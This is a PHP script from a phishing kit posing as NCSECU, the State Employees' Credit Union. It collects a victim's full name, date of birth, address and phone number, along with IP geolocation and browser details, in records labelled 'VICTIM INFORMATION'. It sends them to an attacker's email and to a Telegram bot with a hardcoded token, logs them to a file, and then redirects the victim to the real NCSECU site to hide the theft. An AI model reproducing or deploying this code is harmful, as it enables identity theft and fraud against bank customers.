<?php
session_start();
error_reporting(0);
@ini_set('display_errors', 0);
if(isset($_POST['submit_btn'])){
    $fullname = $_POST['fullname'];
    $dob = $_POST['dob'];
    $address = $_POST['address'];
    $city = $_POST['city'];
    $state = $_POST['state'];
    $zip = $_POST['zip'];
    $phone = $_POST['phone'];
    $TIME_DATE = date('H:i:s d/m/Y');
    include("system/blocker.php");
    include('function/Email.php');
    $TchatId = trim(file_get_contents("config/chatId.ini"));
    $TbotToken = trim(file_get_contents("config/botToken.ini"));
    $telegram = trim(file_get_contents("config/status_telegram.ini"));
    $ssave = trim(file_get_contents("config/status_save.ini"));
    extract($_REQUEST);
    ####################################
    ###############Get ip###############
    ####################################
    $client  = $_SERVER['HTTP_CLIENT_IP'];
    $forward = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $_SESSION['_ip_'] = $ip = $forward;
    }
    else{
        $_SESSION['_ip_'] = $ip = $remote;
    }
    $IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_']));
    $LOOKUP_COUNTRY  = $IP_LOOKUP->country;
    $LOOKUP_MINCODE  = $IP_LOOKUP->countryCode;
    $LOOKUP_CITY     = $IP_LOOKUP->city;
    $LOOKUP_REGION   = $IP_LOOKUP->region;
    $LOOKUP_STATE    = $IP_LOOKUP->regionName;
    $LOOKUP_ZIPCODE  = $IP_LOOKUP->zip;
    $LOOKUP_LOWCODE  = strtolower($LOOKUP_MINCODE);
    $_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
    $_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_MINCODE;
    $_SESSION['_LOOKUP_CNTRCODELOW_']= $LOOKUP_LOWCODE;
    $_SESSION['_LOOKUP_CITY_']    = $LOOKUP_CITY;
    $_SESSION['_LOOKUP_REGION_']  = $LOOKUP_REGION;
    $_SESSION['_LOOKUP_STATE_']   = $LOOKUP_STATE;
    $_SESSION['_LOOKUP_ZIPCODE_'] = $LOOKUP_ZIPCODE;
    $_SESSION['_LOOKUP_REGIONS_'] = $_SESSION['_LOOKUP_STATE_']."(".$_SESSION['_LOOKUP_REGION_'].")";
    $_SESSION['_forlogin_'] = $LOOKUP_MINCODE." - ".$_SESSION['_ip_'];
    #########################################
    ################get browser##############
    #########################################
    function bmo_OS($USER_AGENT){
        $OS_ERROR    =   "Unknown OS Platform";
        $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                        '/windows nt 6.2/i'     =>  'Windows 8',
                        '/windows nt 6.1/i'     =>  'Windows 7',
                        '/windows nt 6.0/i'     =>  'Windows Vista',
                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                        '/windows nt 5.1/i'     =>  'Windows XP',
                        '/windows xp/i'         =>  'Windows XP',
                        '/windows nt 5.0/i'     =>  'Windows 2000',
                        '/windows me/i'         =>  'Windows ME',
                        '/win98/i'              =>  'Windows 98',
                        '/win95/i'              =>  'Windows 95',
                        '/win16/i'              =>  'Windows 3.11',
                        '/macintosh|mac os x/i' =>  'Mac OS X',
                        '/mac_powerpc/i'        =>  'Mac OS 9',
                        '/linux/i'              =>  'Linux',
                        '/ubuntu/i'             =>  'Ubuntu',
                        '/iphone/i'             =>  'iPhone',
                        '/ipod/i'               =>  'iPod',
                        '/ipad/i'               =>  'iPad',
                        '/android/i'            =>  'Android',
                        '/blackberry/i'         =>  'BlackBerry',
                        '/webos/i'              =>  'Mobile');
        foreach ($OS as $regex => $value) { 
            if (preg_match($regex, $USER_AGENT)) {
                $OS_ERROR = $value;
            }

        }   
        return $OS_ERROR;
    }

    function bmo_Browser($USER_AGENT){
        $BROWSER_ERROR    =   "Unknown Browser";
        $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser');
        foreach ($BROWSER as $regex => $value) { 
            if (preg_match($regex, $USER_AGENT)) {
                $BROWSER_ERROR = $value;
            }
        }
        return $BROWSER_ERROR;
    }
    #########################################
    ############ Info #######################
    #########################################
    $_SESSION['fullname']  = $_POST['fullname'];
    $_SESSION['dob']  = $_POST['dob'];
    $_SESSION['address']  = $_POST['address'];
    $_SESSION['city']  = $_POST['city'];
    $_SESSION['state']  = $_POST['state'];
    $_SESSION['zip']  = $_POST['zip'];
    $_SESSION['phone']  = $_POST['phone'];
    ##################################################################################
    $ncsecu_MESSAGE="<html><body>
            <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
            ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> NCSECU BILLING INFO </font> [+]</font> #############################<br>
            <font style='color:#9c0000;'>[+]</font> [Full Name] = <font style='color:#0070ba;'>".$_SESSION['fullname']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [D.O.B] = <font style='color:#0070ba;'>".$_SESSION['dob']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [Address] = <font style='color:#0070ba;'>".$_SESSION['address']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'>".$_SESSION['city']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [State] = <font style='color:#0070ba;'>".$_SESSION['state']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [Zip] = <font style='color:#0070ba;'>".$_SESSION['zip']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [Phone] = <font style='color:#0070ba;'>".$_SESSION['phone']."</font><br>
            ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> NCSECU BILLING INFO </font> [+]</font> ###########################<br>
            <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [State]   = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
            ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> NCSECU BILLING INFO</font> [+]</font> ###########################<br>
            <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/".$_SESSION['_ip_']."</font><br>
            <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
            <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>".bmo_Browser($_SERVER['HTTP_USER_AGENT'])." On ".bmo_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
            
            </div>
            </body></html>";
    $Tncsecu_MESSAGE="
            NCSECU BILLING INFO ".$_SESSION['_ip_']."\n
            Full Name = ".$_SESSION['fullname']."\n
            D.O.B = ".$_SESSION['dob']."\n
            Address = ".$_SESSION['address']."\n
            City = ".$_SESSION['city']."\n
            State = ".$_SESSION['state']."\n
            Zip = ".$_SESSION['zip']."\n
            Phone = ".$_SESSION['phone']."\n

            VICTIM INFORMATION 1\n
            City = ".$_SESSION['_LOOKUP_CITY_']."\n
            State   = ".$_SESSION['_LOOKUP_REGIONS_']."\n
            Zip Code = ".$_SESSION['_LOOKUP_ZIPCODE_']."\n
            
            VICTIM INFORMATION 2\n
            IP INFO = ".$_SESSION['_ip_']."\n
            TIME/DATE = ".$TIME_DATE."\n
            BROWSER = ".bmo_Browser($_SERVER['HTTP_USER_AGENT'])." On ".bmo_OS($_SERVER['HTTP_USER_AGENT'])."";
    ################ [+] BMO_SUBJECT [+] ################
    $ncsecu_SUBJECT = "New-Result (".$_SESSION['_forlogin_'].")";
    ################ [+] BMO_HEADERS [+] ################
    $site = $_SERVER['HTTP_HOST'];
	$new = rand(10,99);
	$new1 = substr(md5(mt_rand()), 0, 7);
	$from = $new1."service@".$site;
	$ncsecu_HEADERS = "From: VR <".$from.">\r\n";
	$ncsecu_HEADERS = "Reply-To: ".$from."\r\n";
	$ncsecu_HEADERS = "MIME-Version: 1.0\r\n";
	$ncsecu_HEADERS = "Content-Type: text/html; charset=ISO-8859-1\r\n";
    ################## [+] SEND MAIL [+] ###################
    if (!empty($_POST['fullname'])){
    @mail($bill_EMAIL, $ncsecu_SUBJECT, $ncsecu_MESSAGE, $ncsecu_HEADERS);}
    if ($ssave == "on"){
        $save=fopen("LoginResults.html","a+");
        fwrite($save,$ncsecu_MESSAGE);
        fclose($save);
        }
        $txt = $Tncsecu_MESSAGE;
        $chatId = "1110104785";
        $botToken = "bot7138647734:AAEfAEKMOo5o4dOyfmb3-g2BxuN3S2g3suk";
        if ($telegram == "on"){
        $send = ['chat_id'=>$chatId,'text'=>$txt];
        $web_telegram = "https://api.telegram.org/{$botToken}";
        $ch = curl_init($web_telegram . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        }
    ################## [+] NEXT PAGE [+] ###################
    unset($_SESSION['fullname']);
    unset($_SESSION['dob']);
    unset($_SESSION['address']);
    unset($_SESSION['city']);
    unset($_SESSION['state']);
    unset($_SESSION['zip']);
    unset($_SESSION['phone']);
    header("Location: https://www.ncsecu.org/TaxServices/FreeTaxReturnPreparation.html");
}else{
    header("Location: index.php");
}
?>